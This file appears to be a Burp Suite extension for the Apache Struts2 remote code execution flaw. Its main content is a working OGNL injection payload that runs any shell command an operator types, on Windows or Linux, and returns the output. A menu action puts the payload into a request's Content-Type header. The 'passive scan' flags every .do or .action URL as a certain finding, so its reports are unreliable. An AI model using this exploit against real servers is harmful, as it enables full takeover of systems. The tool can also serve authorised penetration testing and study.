from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue
from burp import IHttpListener
from burp import IContextMenuFactory
from javax.swing import JMenuItem
from javax.swing import JOptionPane
from javax.swing import JFrame
from java.util import List, ArrayList

PAYLOAD = "%{{(#_='multipart/form-data')."\
          "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."\
          "(#_memberAccess?"\
          "(#_memberAccess=#dm):"\
          "((#container=#context['com.opensymphony.xwork2."\
          "ActionContext.container'])."\
          "(#ognlUtil=#container.getInstance(@com.opensymphony."\
          "xwork2.ognl.OgnlUtil@class))."\
          "(#ognlUtil.getExcludedPackageNames().clear())."\
          "(#ognlUtil.getExcludedClasses().clear())."\
          "(#context.setMemberAccess(#dm))))."\
          "(#cmd='{0}')."\
          "(#iswin=(@java.lang.System@getProperty('os.name')."\
          "toLowerCase().contains('win')))."\
          "(#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:"\
          "{{'/bin/bash','-c',#cmd}}))."\
          "(#p=new java.lang.ProcessBuilder(#cmds))."\
          "(#p.redirectErrorStream(true)).(#process=#p.start())."\
          "(#ros=(@org.apache.struts2.ServletActionContext@get"\
          "Response().getOutputStream()))."\
          "(@org.apache.commons.io.IOUtils@copy"\
          "(#process.getInputStream(),#ros)).(#ros.flush())}}"


ISSUE = "Apache Struts2 RCE"
SEVERITY = "Medium"
ISSUE_DETAIL = "This vulnerability allows an attacker to "\
               "execute arbitray code on remote host."

PUBLISH_ISSUE = "CustomScanIssue(currentMessage.getHttpService()"\
                ",self._helpers.analyzeRequest(currentMessage)"\
                ".getUrl(),[self._callbacks.applyMarkers"\
                "(currentMessage, None, None)]"\
                ",\"{0}\",\"{1}\",\"{2}\")".format(ISSUE,
                                                   ISSUE_DETAIL,
                                                   SEVERITY)


class BurpExtender(IBurpExtender, IHttpListener,
                   IScannerCheck, IContextMenuFactory):

    def banner(self):
        print "Successfully loaded Apache Struts2 RCE - v0.1"

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self.context = None
        self._callbacks.setExtensionName("Apache Struts2 RCE Checker")
        callbacks.registerHttpListener(self)
        callbacks.registerScannerCheck(self)
        callbacks.registerContextMenuFactory(self)
        self.banner()

    def createMenuItems(self, context_menu):
        self.context = context_menu
        menu_list = ArrayList()
        menu_list.add(JMenuItem("Send to Apache Struts2 RCE Xploiter",
                                actionPerformed=self.setPayload))
        return menu_list

    def setPayload(self, event):
        proto = 0
        httpRequestResponse = self.context.getSelectedMessages()
        for currentRequest in httpRequestResponse:
            parentFrame = JFrame()
            cmd = JOptionPane.showInputDialog(parentFrame, "Insert the RCE you want to execute on remote target")
            requestInfo = self._helpers.analyzeRequest(currentRequest)
            bodyBytes = currentRequest.getRequest()[requestInfo.getBodyOffset():]
            bodyStr = self._helpers.bytesToString(bodyBytes)
            headers = requestInfo.getHeaders()
            newHeaders = list(headers)
            for header in newHeaders:
                if 'content-type' in header.lower():
                    newHeaders.remove(header)
            newHeaders.append('Content-Type: {0}'.format(PAYLOAD.format(cmd)))
            newMessage = self._helpers.buildHttpMessage(newHeaders, bodyStr)
            host = currentRequest.getHttpService().getHost()
            port = currentRequest.getHttpService().getPort()
            if currentRequest.getHttpService().getProtocol() == 'https':
                proto = 1
            self._callbacks.sendToRepeater(host, port, proto, newMessage, None)

    def processHttpMessage(self, toolFlag, messageIsRequest, currentMessage):
        if not messageIsRequest:
            return

        if toolFlag == 8:
            if self.validate_file_extensions(currentMessage):
                issue = eval(PUBLISH_ISSUE)
                self._callbacks.addScanIssue(issue)

    def doPassiveScan(self, currentMessage):
        if self.validate_file_extensions(currentMessage):
            return [eval(PUBLISH_ISSUE)]

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        if (existingIssue.getIssueName() == newIssue.getIssueName()):
            return -1
        else:
            return 0

    def validate_file_extensions(self, currentMessage):
        files = ['.do', '.action']
        url = str(self._helpers.analyzeRequest(currentMessage).getUrl())
        if not any(url.split('?')[0].endswith(f) for f in files):
            return 0
        return 1


class CustomScanIssue(IScanIssue):

    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail + '<br/><br/><div style="font-size:8px">'\
                                'This issue was reported by Apache Struts2 '\
                                'RCE Extension</div>'
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        pass

    def getRemediationBackground(self):
        pass

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        pass

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
